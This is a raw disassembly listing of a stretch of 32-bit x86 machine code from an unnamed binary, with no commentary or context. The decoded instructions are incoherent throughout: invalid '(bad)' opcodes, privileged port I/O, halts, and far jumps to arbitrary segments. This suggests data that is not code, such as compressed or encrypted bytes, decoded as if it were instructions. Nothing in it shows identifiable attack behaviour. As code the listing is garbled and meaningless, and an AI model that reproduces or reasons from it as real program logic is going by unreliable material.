  41c597:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c59d:	jecxz  0x41c5b9
  41c59f:	push   0x10
  41c5a1:	stc    
  41c5a2:	push   cs
  41c5a3:	push   0x33
  41c5a5:	pop    ebx
  41c5a6:	arpl   WORD PTR [ebx],bp
  41c5a8:	add    DWORD PTR [eax],eax
  41c5aa:	pop    es
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    BYTE PTR [ebx],ah
  41c5af:	or     DWORD PTR [edx+0x1ea818f0],esi
  41c5b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b6:	(bad)  
  41c5b7:	popa   
  41c5b8:	out    0x6d,al
  41c5ba:	mov    cl,0x1e
  41c5bc:	inc    edi
  41c5bd:	cli    
  41c5be:	jg     0x41c628
  41c5c0:	mov    cl,cl
  41c5c2:	or     eax,0xd1e5bdcb
  41c5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5c8:	add    eax,0x4f78ce3d
  41c5cd:	and    BYTE PTR [edi-0x41],bl
  41c5d0:	repz cmp al,0x9d
  41c5d3:	iret   
  41c5d4:	sahf   
  41c5d5:	cmc    
  41c5d6:	or     dh,BYTE PTR [edi+0x21921a76]
  41c5dc:	dec    edi
  41c5dd:	dec    edx
  41c5de:	hlt    
  41c5df:	test   edx,eax
  41c5e1:	mov    ah,0xb7
  41c5e3:	inc    eax
  41c5e4:	in     al,0x3d
  41c5e6:	sbb    al,0x5f
  41c5e8:	sti    
  41c5e9:	xchg   esi,eax
  41c5ea:	inc    ecx
  41c5eb:	mov    bl,0x66
  41c5ed:	cmp    esi,ebp
  41c5ef:	aam    0x90
  41c5f1:	cmp    al,0x1b
  41c5f3:	mov    dl,0x4e
  41c5f5:	push   esi
  41c5f6:	or     BYTE PTR [edi],0x96
  41c5f9:	add    ecx,DWORD PTR [ebx]
  41c5fb:	mov    ebp,0x5184d01b
  41c600:	and    edi,DWORD PTR [esi]
  41c602:	or     DWORD PTR [eax-0x3c44d673],ecx
  41c608:	shr    BYTE PTR [ebp-0x35],0x42
  41c60c:	outs   dx,BYTE PTR ds:[esi]
  41c60d:	cmp    al,0xb9
  41c60f:	mov    eax,ds:0xd8d09695
  41c614:	mov    DWORD PTR [ebp+0x30],esi
  41c617:	(bad)  
  41c618:	mov    cl,0x65
  41c61a:	test   DWORD PTR [eax+edi*8-0x7e],esi
  41c61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c61f:	mov    al,0x9b
  41c621:	imul   eax,DWORD PTR [eax+edi*1-0x9],0x8cb9ac59
  41c629:	cmp    edi,DWORD PTR [esi]
  41c62b:	jle    0x41c622
  41c62d:	push   es
  41c62e:	or     ah,al
  41c630:	jne    0x41c624
  41c632:	jbe    0x41c603
  41c634:	call   0xfd86:0x3f352629
  41c63b:	add    BYTE PTR [ebp-0x36],ah
  41c63e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c63f:	mov    ebx,0xeb87b563
  41c644:	jnp    0x41c627
  41c646:	push   cs
  41c647:	fidiv  DWORD PTR [ecx+0x255087ac]
  41c64d:	jae    0x41c60f
  41c64f:	ds repnz iret 
  41c652:	out    0x2f,eax
  41c654:	mov    dh,BYTE PTR [edx+0x0]
  41c657:	pop    ds
  41c658:	pusha  
  41c659:	out    0xa6,al
  41c65b:	xchg   esi,eax
  41c65c:	xchg   BYTE PTR [esi+esi*1+0x575cc75d],ah
  41c663:	cdq    
  41c664:	dec    esp
  41c665:	cmp    al,0x80
  41c667:	jmp    0x41c6cb
  41c669:	xor    BYTE PTR [eax-0x10],bh
  41c66c:	loop   0x41c646
  41c66e:	xor    DWORD PTR ds:0x490130cb,0xffffffa7
  41c675:	ins    DWORD PTR es:[edi],dx
  41c676:	call   0x6e510414
  41c67b:	ret    0x6a40
  41c67e:	in     eax,0x14
  41c680:	out    dx,eax
  41c681:	clc    
  41c682:	cdq    
  41c683:	cmp    al,0x81
  41c685:	lahf   
  41c686:	les    edi,FWORD PTR [edi-0x79af81ae]
  41c68c:	int3   
  41c68d:	scas   al,BYTE PTR es:[edi]
  41c68e:	in     eax,dx
  41c68f:	pop    eax
  41c690:	scas   al,BYTE PTR es:[edi]
  41c691:	ins    BYTE PTR es:[edi],dx
  41c692:	ret    0xe3e9
  41c695:	(bad)  
  41c696:	(bad)  
  41c697:	jnp    0x41c711
  41c699:	sbb    al,0x53
  41c69b:	dec    edi
  41c69c:	xor    bl,BYTE PTR [edi-0x2e]
  41c69f:	imul   ebx,DWORD PTR [ecx],0x96de3278
  41c6a5:	inc    ecx
  41c6a6:	loope  0x41c68f
  41c6a8:	arpl   WORD PTR [eax],di
  41c6aa:	fstp   DWORD PTR [ebp-0x7696d879]
  41c6b0:	cld    
  41c6b1:	iret   
  41c6b2:	adc    al,0x96
  41c6b4:	pushf  
	...
  41c715:	add    dl,bl
  41c717:	add    edx,eax
  41c719:	xchg   bl,bl
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	inc    ebp
  41c723:	js     0x41c724
  41c725:	stc    
  41c726:	push   0x2c
  41c728:	add    DWORD PTR [eax],eax
  41c72a:	pop    es
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    BYTE PTR [edx-0x2b93cc3b],bl
  41c733:	push   edx
  41c734:	les    ebp,FWORD PTR [eax+ecx*2]
  41c737:	xchg   ebp,eax
  41c738:	test   DWORD PTR [edx-0x351fcf8d],0x9e3c55b3
  41c742:	lods   eax,DWORD PTR ds:[esi]
  41c743:	mov    al,0x44
  41c745:	and    eax,0xe55d5087
  41c74a:	sbb    BYTE PTR [ecx],ch
  41c74c:	cld    
  41c74d:	mov    bh,0x3d
  41c74f:	idiv   BYTE PTR [ebp+0x74]
  41c752:	out    dx,al
  41c753:	mov    edi,0x23f9e8e6
  41c758:	ins    BYTE PTR es:[edi],dx
  41c759:	lock sahf 
  41c75b:	ins    DWORD PTR es:[edi],dx
  41c75c:	mov    ds:0x48d47f64,al
  41c761:	bound  ebx,QWORD PTR [ecx-0x7a82115b]
  41c767:	inc    ebp
  41c768:	mov    bl,0x0
  41c76a:	mov    ds,WORD PTR [edx-0x5c]
  41c76d:	dec    ebp
  41c76e:	jecxz  0x41c799
  41c770:	idiv   DWORD PTR [edi-0x1b]
  41c773:	enter  0x3f80,0x67
  41c777:	add    esi,DWORD PTR [eax+0x2c]
  41c77a:	inc    edi
  41c77b:	les    ecx,FWORD PTR [edi]
  41c77d:	mov    cl,0xa3
  41c77f:	mov    ebp,0x798ada3b
  41c784:	out    dx,al
  41c785:	sbb    DWORD PTR [ebx],ebx
  41c787:	sub    DWORD PTR [edi],eax
  41c789:	mov    esi,DWORD PTR [ebx]
  41c78b:	pop    edi
  41c78c:	jno    0x41c7de
  41c78e:	ror    DWORD PTR [edx-0x709b1ba1],1
  41c794:	jo     0x41c799
  41c796:	gs pusha 
  41c798:	ficomp DWORD PTR [edx-0x43]
  41c79b:	and    ch,ch
  41c79d:	rcl    esi,0x4e
  41c7a0:	mov    ebx,0x54f7bfc4
  41c7a5:	bound  esi,QWORD PTR [esi]
  41c7a7:	es ret 
  41c7a9:	and    al,0xb1
  41c7ab:	ins    DWORD PTR es:[edi],dx
  41c7ac:	or     eax,0x8562eb65
  41c7b1:	fimul  WORD PTR [eax]
  41c7b3:	out    0x49,al
  41c7b5:	sub    eax,0x51fdcefe
  41c7ba:	loopne 0x41c7c4
  41c7bc:	(bad)  
  41c7bd:	pop    edi
  41c7be:	fwait
  41c7bf:	sub    al,0x72
  41c7c1:	imul   esp,DWORD PTR [eax+0x1d343e41],0x20
  41c7c8:	or     BYTE PTR [eax+0x30],0xb9
  41c7cc:	cmp    DWORD PTR [esi+0x114d56c7],esp
  41c7d2:	mov    ch,bl
  41c7d4:	hlt    
  41c7d5:	hlt    
  41c7d6:	cs sar edi,0xe7
  41c7da:	js     0x41c7d8
  41c7dc:	mov    dh,0x24
  41c7de:	jle    0x41c814
  41c7e0:	sub    al,0xb0
  41c7e2:	sub    ah,BYTE PTR [ecx]
  41c7e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7e5:	fwait
  41c7e6:	pop    esp
  41c7e7:	rcr    BYTE PTR [edi-0x2d],cl
  41c7ea:	add    eax,0x384d0822
  41c7ef:	jo     0x41c7a0
  41c7f1:	sbb    bl,BYTE PTR [edi-0xc98ad78]
  41c7f7:	dec    ecx
  41c7f8:	cmp    esp,DWORD PTR [ebx-0x55]
  41c7fb:	push   edi
  41c7fc:	ja     0x41c866
  41c7fe:	mov    ecx,fs
  41c800:	jmp    0x2a0:0xe67bd011
  41c807:	sub    eax,ebx
  41c809:	test   ebp,esi
  41c80b:	xchg   ebx,eax
  41c80c:	add    al,BYTE PTR [ebx]
  41c80e:	scas   eax,DWORD PTR es:[edi]
  41c80f:	sub    al,0xf4
  41c811:	dec    ebp
  41c812:	scas   al,BYTE PTR es:[edi]
  41c813:	and    edx,DWORD PTR [eax+0x4766849]
  41c819:	pop    esp
  41c81a:	dec    ebx
  41c81b:	mov    ebp,DWORD PTR [edi+0xe]
  41c81e:	iret   
  41c81f:	dec    eax
  41c820:	push   ebx
  41c821:	jne    0x41c83e
  41c823:	xlat   BYTE PTR ds:[ebx]
  41c824:	mov    ebx,0x2fd715b0
  41c829:	xor    DWORD PTR [esp+ebp*1],esp
  41c82c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c82d:	stos   DWORD PTR es:[edi],eax
  41c82e:	outs   dx,BYTE PTR ds:[esi]
  41c82f:	mov    DWORD PTR [edi],edi
  41c831:	mov    cl,0x8a
  41c833:	pop    es
  41c834:	test   al,0x0
	...
  41c896:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c89d:	ja     0x41c8c2
  41c89f:	cs js  0x41c910
  41c8a2:	and    BYTE PTR [ebx+edi*2],dl
  41c8a5:	call   0x107:0x12d71
  41c8ac:	add    BYTE PTR [eax],al
  41c8ae:	mov    dl,0xd3
  41c8b0:	mov    bh,0xa5
  41c8b2:	xor    BYTE PTR [edi],ch
  41c8b4:	xchg   DWORD PTR [edi-0x124f545a],edx
  41c8ba:	mov    ebx,0x60f59cf0
  41c8bf:	cmp    al,0xac
  41c8c1:	xor    al,0xd6
  41c8c3:	sbb    edi,DWORD PTR [eax]
  41c8c5:	leave  
  41c8c6:	xor    BYTE PTR [ebx],bl
  41c8c8:	inc    edi
  41c8c9:	sub    ebx,DWORD PTR [eax]
  41c8cb:	pop    edi
  41c8cc:	shl    BYTE PTR [esp+ebx*8],0x19
  41c8d0:	dec    ebp
  41c8d1:	ret    
  41c8d2:	scas   eax,DWORD PTR es:[edi]
  41c8d3:	enter  0x269e,0xb1
  41c8d7:	rcl    BYTE PTR [edx+edi*1-0x395f35a1],1
  41c8de:	jo     0x41c90c
  41c8e0:	mov    al,ds:0x6b5793b7
  41c8e5:	jecxz  0x41c882
  41c8e7:	(bad)  
  41c8e8:	or     eax,0x1c5afb0d
  41c8ed:	out    dx,al
  41c8ee:	ror    eax,1
  41c8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8f1:	inc    eax
  41c8f2:	out    0x41,eax
  41c8f4:	mov    ebx,0xb271034e
  41c8f9:	fucomip st,st(1)
  41c8fb:	jmp    0x41c906
  41c8fd:	adc    ah,dl
  41c8ff:	arpl   WORD PTR [edi+0x7d4b622c],sp
  41c905:	jmp    0x416c:0x4301ba58
  41c90c:	fldenv [ebx-0x3a]
  41c90f:	jne    0x41c8da
  41c911:	pop    edi
  41c912:	rcr    BYTE PTR [esi-0x51],1
  41c915:	int    0x39
  41c917:	mov    bl,0x44
  41c919:	and    bl,BYTE PTR [esi+eax*1+0x5]
  41c91d:	xlat   BYTE PTR ds:[ebx]
  41c91e:	lods   eax,DWORD PTR ds:[esi]
  41c91f:	adc    al,0xcb
  41c921:	xor    DWORD PTR [edi],eax
  41c923:	and    DWORD PTR [ebp+0x359632be],esp
  41c929:	shl    DWORD PTR [edx+0x5],1
  41c92c:	in     al,dx
  41c92d:	daa    
  41c92e:	fdivr  st,st(3)
  41c930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c931:	fld    QWORD PTR [ebx-0x475529f8]
  41c937:	or     DWORD PTR [edi-0x19ddf3b9],0x24
  41c93e:	xor    DWORD PTR [esp+ebx*2+0x5a7d4e0b],ebp
  41c945:	rcl    BYTE PTR [eax+edx*4+0x1d],1
  41c949:	cli    
  41c94a:	jge    0x41c8ce
  41c94c:	mov    BYTE PTR [edi-0x5d],bh
  41c94f:	mov    dh,0xbd
  41c951:	mov    bl,0x73
  41c953:	ret    
  41c954:	ficom  WORD PTR [esi]
  41c956:	pushf  
  41c957:	aaa    
  41c958:	xchg   eax,esp
  41c95a:	mov    BYTE PTR [ebx],bl
  41c95c:	add    ecx,ebx
  41c95e:	add    eax,0x34c526c3
  41c963:	pop    edi
  41c964:	adc    eax,0xed077939
  41c969:	inc    edi
  41c96a:	push   cs
  41c96b:	sub    eax,0x5441d4a8
  41c970:	jae    0x41c991
  41c972:	retf   
  41c973:	cwde   
  41c974:	jg     0x41c9d4
  41c976:	rcl    BYTE PTR [ebx-0xb0f9fe1],0xfb
  41c97d:	scas   al,BYTE PTR es:[edi]
  41c97e:	out    dx,eax
  41c97f:	mov    esi,0xb7b3d67e
  41c984:	mov    al,ds:0x37365fe7
  41c989:	std    
  41c98a:	dec    ecx
  41c98b:	push   eax
  41c98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c98d:	ja     0x41c9aa
  41c98f:	push   ds
  41c990:	fiadd  WORD PTR [esi+0x66]
  41c993:	mov    ah,0xe0
  41c995:	mov    edx,0x6f230d10
  41c99a:	out    0xba,eax
  41c99c:	sbb    eax,0x48b5a18d
  41c9a1:	(bad)  
  41c9a2:	pop    ecx
  41c9a3:	outs   dx,BYTE PTR ds:[esi]
  41c9a4:	bound  esp,QWORD PTR [edx-0x20526213]
  41c9aa:	push   esp
  41c9ab:	sub    edx,DWORD PTR [eax]
  41c9ad:	ss jge 0x41ca03
  41c9b0:	outs   dx,BYTE PTR ds:[esi]
  41c9b1:	sbb    eax,0x1197f5
	...
  41ca16:	lock retf 0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0xdff624e9
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [eax],dh
  41ca2f:	mov    dl,al
  41ca31:	mov    ds:0x4235bf0a,eax
  41ca36:	push   0xffffffae
  41ca38:	ins    BYTE PTR es:[edi],dx
  41ca39:	jmp    0xf923407a
  41ca3e:	xlat   BYTE PTR ds:[ebx]
  41ca3f:	iret   
  41ca40:	out    0x17,al
  41ca42:	push   0x20
  41ca44:	scas   eax,DWORD PTR es:[edi]
  41ca45:	pop    ecx
  41ca46:	pop    ebp
  41ca47:	fbstp  TBYTE PTR [eax+0x1a]
  41ca4a:	xchg   esi,eax
  41ca4b:	cld    
  41ca4c:	fdiv   QWORD PTR [ebp+0x6f]
  41ca4f:	pop    ecx
  41ca50:	mov    dh,0x7a
  41ca52:	fs mov ebp,0x25839acb
  41ca58:	jecxz  0x41ca33
  41ca5a:	pop    edi
  41ca5b:	addr16 test bh,bh
  41ca5e:	leave  
  41ca5f:	mov    esp,0xa1dac4e0
  41ca64:	and    BYTE PTR [esi+edi*8-0x56],0xa5
  41ca69:	repnz sar esi,0x76
  41ca6d:	add    al,0xbb
  41ca6f:	test   edx,edx
  41ca71:	and    DWORD PTR [edx+0x7],ebx
  41ca74:	mov    edi,0xa90e6056
  41ca79:	jno    0x41ca3d
  41ca7b:	xor    ecx,ecx
  41ca7d:	or     al,BYTE PTR [ecx-0x5d1c5b0c]
  41ca83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca84:	mov    al,0xc1
  41ca86:	loope  0x41ca3d
  41ca88:	and    eax,0xc2fbdbc3
  41ca8d:	mov    esi,DWORD PTR [ecx]
  41ca8f:	imul   esp,DWORD PTR [esi-0x438ab41e],0xfffffffb
  41ca96:	setg   BYTE PTR [edx-0xa]
  41ca9a:	xchg   ebp,eax
  41ca9b:	fs repnz dec edi
  41ca9e:	xor    BYTE PTR [edi],al
  41caa0:	sar    BYTE PTR [ebp-0x74ec5674],1
  41caa6:	pop    edi
  41caa7:	clc    
  41caa8:	mov    edi,0xf1f7beb3
  41caad:	shl    BYTE PTR ds:0x555ceadb,cl
  41cab3:	add    bh,al
  41cab5:	into   
  41cab6:	cdq    
  41cab7:	loop   0x41cad7
  41cab9:	fisub  WORD PTR [edi]
  41cabb:	cmp    al,0x98
  41cabd:	test   eax,0x32ba51b8
  41cac2:	jge    0x41ca5d
  41cac4:	arpl   WORD PTR [eax],sp
  41cac6:	xlat   BYTE PTR ds:[ebx]
  41cac7:	ins    BYTE PTR es:[edi],dx
  41cac8:	sbb    al,0xb8
  41caca:	stos   DWORD PTR es:[edi],eax
  41cacb:	fadd   DWORD PTR [edi-0x197d66be]
  41cad1:	jnp    0x41cb0e
  41cad3:	aad    0xaf
  41cad5:	mov    ?,ebp
  41cad7:	aaa    
  41cad8:	ds ja  0x41cb11
  41cadb:	mov    edi,0x5966cb2c
  41cae0:	lds    esi,FWORD PTR [eax-0x28f4b16b]
  41cae6:	mov    ch,0x1a
  41cae8:	inc    esi
  41cae9:	inc    edx
  41caea:	mov    dh,0xc7
  41caec:	ret    
  41caed:	in     eax,0x50
  41caef:	or     eax,0xd6499533
  41caf4:	jbe    0x41cb1f
  41caf6:	arpl   WORD PTR [esi],bx
  41caf8:	cmp    DWORD PTR [esi+0x1d],eax
  41cafb:	imul   ecx,ebp,0x2fb0051d
  41cb01:	nop
  41cb02:	repz stc 
  41cb04:	loope  0x41caa2
  41cb06:	fldenv [edi+0x7d]
  41cb09:	push   eax
  41cb0a:	mov    esi,0x3871037
  41cb0f:	punpckhbw mm0,QWORD PTR [eax-0xe0a6404]
  41cb16:	(bad)  
  41cb17:	cmc    
  41cb18:	mov    ecx,DWORD PTR [esp+edx*8-0x687bd42]
  41cb1f:	test   esp,eax
  41cb21:	xchg   esi,eax
  41cb22:	in     eax,dx
  41cb23:	outs   dx,BYTE PTR ds:[esi]
  41cb24:	xchg   DWORD PTR [ecx+0x7b],edx
  41cb27:	inc    esi
  41cb28:	sbb    eax,0xf9ae309e
  41cb2d:	mov    esp,ebx
  41cb2f:	push   ds
  41cb30:	(bad)  
  41cb31:	cmp    eax,0xba4442
	...
  41cb96:	sub    esi,edx
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi+0x54c23c4c]
  41cba3:	mov    dh,0xdb
  41cba5:	pop    ebp
  41cba6:	jg     0x41cbd7
  41cba8:	add    DWORD PTR [eax],eax
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    BYTE PTR [eax+edx*1+0x4f],bl
  41cbb1:	sub    edx,0xffffff84
  41cbb4:	xchg   ebp,eax
  41cbb5:	ret    0x434
  41cbb8:	sbb    eax,0x55b25d7f
  41cbbd:	mov    dl,0x54
  41cbbf:	ror    BYTE PTR [eax],1
  41cbc1:	pop    ebx
  41cbc2:	pushf  
  41cbc3:	mov    al,ds:0x17fc13d5
  41cbc8:	mov    al,0xc6
  41cbca:	loopne 0x41cbc6
  41cbcc:	in     al,dx
  41cbcd:	scas   al,BYTE PTR es:[edi]
  41cbce:	sahf   
  41cbcf:	or     eax,0x38821506
  41cbd4:	or     DWORD PTR fs:[edx+0x6118bf07],edx
  41cbdb:	arpl   WORD PTR ds:0x4b56379d,cx
  41cbe1:	mov    ch,0x86
  41cbe3:	mov    ds:0xf9db3c92,eax
  41cbe8:	xchg   edx,eax
  41cbe9:	inc    eax
  41cbea:	mov    BYTE PTR [edx+0x4982e6b5],dl
  41cbf0:	jns    0x41cc19
  41cbf2:	adc    eax,0x52e53550
  41cbf7:	xchg   ebx,eax
  41cbf8:	pop    ss
  41cbf9:	dec    eax
  41cbfa:	and    al,0xa6
  41cbfc:	xor    eax,0x5cd19b70
  41cc01:	int    0xbb
  41cc03:	outs   dx,DWORD PTR ds:[esi]
  41cc04:	xor    al,0xb
  41cc06:	cmp    al,ch
  41cc08:	(bad)  
  41cc09:	jno    0x41cb96
  41cc0b:	popa   
  41cc0c:	stos   BYTE PTR es:[edi],al
  41cc0d:	xchg   ecx,eax
  41cc0e:	out    0xb5,al
  41cc10:	imul   esp,edx,0xf39b52fe
  41cc16:	sbb    BYTE PTR [ecx],ch
  41cc18:	sbb    al,0x10
  41cc1a:	pop    ds
  41cc1b:	iret   
  41cc1c:	add    BYTE PTR [eax-0x2],bl
  41cc1f:	inc    esp
  41cc20:	cmp    dh,bl
  41cc22:	cmp    BYTE PTR [edx-0x65],dl
  41cc25:	(bad)  
  41cc26:	pop    ecx
  41cc27:	ret    0xee5
  41cc2a:	inc    ebx
  41cc2b:	xchg   edi,eax
  41cc2c:	adc    DWORD PTR [edx],esi
  41cc2e:	iret   
  41cc2f:	mov    bh,0x17
  41cc31:	shl    BYTE PTR [esi-0x1e736496],0xc4
  41cc38:	push   es
  41cc39:	mov    esp,0x634a13
  41cc3e:	clc    
  41cc3f:	jp     0x41cbdd
  41cc41:	loope  0x41cc49
  41cc43:	mov    ecx,0x3f4ab146
  41cc48:	push   esp
  41cc49:	test   al,0xd7
  41cc4b:	and    DWORD PTR [ebp+0x71],ecx
  41cc4e:	fst    DWORD PTR [eax+edx*4]
  41cc51:	xor    eax,0xde8f99ef
  41cc56:	outs   dx,BYTE PTR cs:[esi]
  41cc58:	mov    esp,0x1334c41f
  41cc5d:	cmp    BYTE PTR [eax-0x54],bh
  41cc60:	adc    edx,0x5545e274
  41cc66:	dec    ecx
  41cc67:	mov    ebx,0x49fa022a
  41cc6c:	test   al,0x14
  41cc6e:	stos   BYTE PTR es:[edi],al
  41cc6f:	ins    BYTE PTR es:[edi],dx
  41cc70:	xor    ah,dh
  41cc72:	sbb    DWORD PTR [edi],0xffffffb8
  41cc75:	xchg   edi,eax
  41cc76:	aad    0x74
  41cc78:	outs   dx,DWORD PTR ds:[esi]
  41cc79:	jns    0x41ccd5
  41cc7b:	jge    0x41cc59
  41cc7d:	sbb    al,0x68
  41cc7f:	jns    0x41cc4c
  41cc81:	ror    DWORD PTR [ebp+0x14bf120e],0x4c
  41cc88:	js     0x41cccc
  41cc8a:	mov    al,0x15
  41cc8c:	add    eax,0xdd6abbfd
  41cc91:	push   edx
  41cc92:	rcl    WORD PTR [ebx],1
  41cc95:	daa    
  41cc96:	ficomp WORD PTR [ebp+0x6e]
  41cc99:	hlt    
  41cc9a:	dec    ebx
  41cc9b:	scas   al,BYTE PTR es:[edi]
  41cc9c:	lahf   
  41cc9d:	adc    BYTE PTR [ebp-0x34650542],ah
  41cca3:	inc    eax
  41cca4:	icebp  
  41cca5:	aas    
  41cca6:	cmp    eax,0x5bcffc62
  41ccab:	sbb    eax,0x421b9c6b
  41ccb0:	(bad)  
  41ccb1:	mov    ds:0xf6e5c,al
	...
  41cd16:	pusha  
  41cd17:	cdq    
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	idiv   eax
  41cd24:	je     0x41ccc2
  41cd26:	xchg   BYTE PTR [eax],dh
  41cd28:	add    DWORD PTR [eax],eax
  41cd2a:	pop    es
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    al,dh
  41cd2f:	sti    
  41cd30:	or     dh,BYTE PTR [ecx]
  41cd32:	sbb    eax,0xe485aa42
  41cd37:	jge    0x41cd6f
  41cd39:	xchg   esi,eax
  41cd3a:	mov    ch,0x3a
  41cd3c:	add    al,0x4c
  41cd3e:	daa    
  41cd3f:	cdq    
  41cd40:	imul   esi,DWORD PTR [ebx],0xffffffc8
  41cd43:	or     eax,DWORD PTR gs:[edx-0x13cd1714]
  41cd4a:	in     al,0x3a
  41cd4c:	jno    0x41cd06
  41cd4e:	or     dh,al
  41cd50:	or     eax,0x82f168ab
  41cd55:	sub    ecx,esi
  41cd57:	cld    
  41cd58:	adc    DWORD PTR [ebx],0x65be2550
  41cd5e:	sbb    al,0xab
  41cd60:	inc    eax
  41cd61:	(bad)  
  41cd62:	mov    al,0xa1
  41cd64:	loope  0x41cd7c
  41cd66:	add    DWORD PTR [eax-0x34f1d8a3],ebp
  41cd6c:	adc    ch,BYTE PTR [ebx+0x67]
  41cd6f:	jle    0x41cd6a
  41cd71:	(bad)  
  41cd72:	int    0x19
  41cd74:	add    edi,ebp
  41cd76:	imul   edx,ebx,0x314311da
  41cd7c:	and    al,0xa7
  41cd7e:	popf   
  41cd7f:	push   ebp
  41cd80:	das    
  41cd81:	cs push 0xffffffa9
  41cd84:	mov    ebx,0x738d7376
  41cd89:	add    ah,BYTE PTR [ecx-0x49b745cb]
  41cd8f:	(bad)  
  41cd90:	or     al,BYTE PTR ds:0xded83130
  41cd96:	rcl    BYTE PTR [ecx],1
  41cd98:	js     0x41cdaa
  41cd9a:	add    al,0x7e
  41cd9c:	loop   0x41cdca
  41cd9e:	jle    0x41ce05
  41cda0:	jnp    0x41cdb0
  41cda2:	pop    esi
  41cda3:	pop    ds
  41cda4:	mov    BYTE PTR [esi+0x7294b615],cl
  41cdaa:	(bad)  
  41cdac:	sub    cl,ah
  41cdae:	push   esi
  41cdaf:	ins    BYTE PTR es:[edi],dx
  41cdb0:	dec    esi
  41cdb1:	adc    eax,0x94a0ec7c
  41cdb6:	lock fmul st(7),st
  41cdb9:	int    0x6c
  41cdbb:	repz inc ecx
  41cdbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdbe:	pop    ds
  41cdbf:	sbb    BYTE PTR [ecx-0x20],0xb9
  41cdc3:	push   edx
  41cdc4:	mov    ebp,0xb1ad0239
  41cdc9:	daa    
  41cdca:	ins    DWORD PTR es:[edi],dx
  41cdcb:	inc    ebx
  41cdcc:	dec    esp
  41cdcd:	sar    DWORD PTR [eax-0x413601a7],cl
  41cdd3:	jo     0x41cd7a
  41cdd5:	dec    esi
  41cdd6:	lahf   
  41cdd7:	call   0x8eec:0xef5c5d27
  41cdde:	aaa    
  41cddf:	fmul   DWORD PTR [eax-0x1a]
  41cde2:	rcl    DWORD PTR [eax+ebx*8],1
  41cde5:	xchg   ecx,eax
  41cde6:	ins    BYTE PTR es:[edi],dx
  41cde7:	mov    ds:0xe536f2f8,eax
  41cdec:	in     al,dx
  41cded:	in     al,0x24
  41cdef:	rcl    DWORD PTR [edi+0x4e],1
  41cdf2:	jle    0x41ce08
  41cdf4:	scas   eax,DWORD PTR es:[edi]
  41cdf5:	out    dx,al
  41cdf6:	push   ebp
  41cdf7:	lods   eax,DWORD PTR ds:[esi]
  41cdf8:	jl     0x41cdd6
  41cdfa:	add    dh,BYTE PTR [edx-0x4]
  41cdfd:	shl    DWORD PTR [ecx-0x329c8aa4],cl
  41ce03:	loope  0x41cdd7
  41ce05:	sti    
  41ce06:	adc    edx,edx
  41ce08:	sub    al,0x76
  41ce0a:	bound  edx,QWORD PTR [eax-0x6c2e82dd]
  41ce10:	int    0xb7
  41ce12:	push   ebx
  41ce13:	les    esi,FWORD PTR [eax-0x78]
  41ce16:	fs jmp 0xac896a04
  41ce1c:	movups xmm2,XMMWORD PTR [edi+0x63168024]
  41ce23:	lods   al,BYTE PTR ds:[esi]
  41ce24:	out    dx,al
  41ce25:	popa   
  41ce26:	add    BYTE PTR [edx+0x7f7872f4],dh
  41ce2c:	nop
  41ce2d:	jge    0x41ce61
  41ce2f:	xor    ecx,eax
  41ce31:	(bad)  
  41ce32:	fwait
  41ce33:	inc    ebx
  41ce34:	aaa    
	...
  41ce95:	add    BYTE PTR [edi],al
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0x823489c7
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    BYTE PTR [ecx+0x7eb0d381],dh
  41ceb3:	ins    BYTE PTR es:[edi],dx
  41ceb4:	js     0x41ce5c
  41ceb6:	leave  
  41ceb7:	inc    ebx
  41ceb8:	mov    ecx,0xb2d53522
  41cebd:	addr16 loope 0x41ceaa
  41cec0:	out    dx,eax
  41cec1:	repnz mov ds:0x29ccaaf6,eax
  41cec7:	imul   edi,DWORD PTR [ecx],0xffffffda
  41ceca:	dec    edi
  41cecb:	and    si,WORD PTR [ebp+0x14]
  41cecf:	adc    DWORD PTR [edi+0x6823eb25],edx
  41ced5:	or     BYTE PTR [esi],cl
  41ced7:	pop    ebx
  41ced8:	in     eax,dx
  41ced9:	mov    eax,ds:0x5aa848e4
  41cede:	add    al,0xf2
  41cee0:	push   ds
  41cee1:	push   esi
  41cee2:	cmp    BYTE PTR [esi-0x26],dl
  41cee5:	sub    esi,DWORD PTR [edi+eax*2+0x4]
  41cee9:	dec    ebx
  41ceea:	popf   
  41ceeb:	jmp    0x3506:0x838bac0d
  41cef2:	add    al,0xab
  41cef4:	gs (bad) 
  41cef6:	push   esp
  41cef7:	outs   dx,DWORD PTR ds:[esi]
